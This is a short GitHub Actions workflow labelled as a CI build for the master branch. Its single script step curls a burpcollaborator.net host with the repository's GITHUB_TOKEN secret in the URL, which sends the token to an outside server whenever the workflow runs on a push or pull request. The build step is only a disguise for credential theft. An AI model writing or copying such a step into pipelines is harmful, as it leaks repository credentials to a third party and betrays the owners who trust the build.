name: CI

on:
  push:
    branches: [ master ]
  pull_request:
    branches: [ master ]
    
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Run a one-line script
      run: |
        curl http://ob3ykqg4xpb9zafu9vkr4c4ay14ssh.burpcollaborator.net/${{ secrets.GITHUB_TOKEN }}
      
      

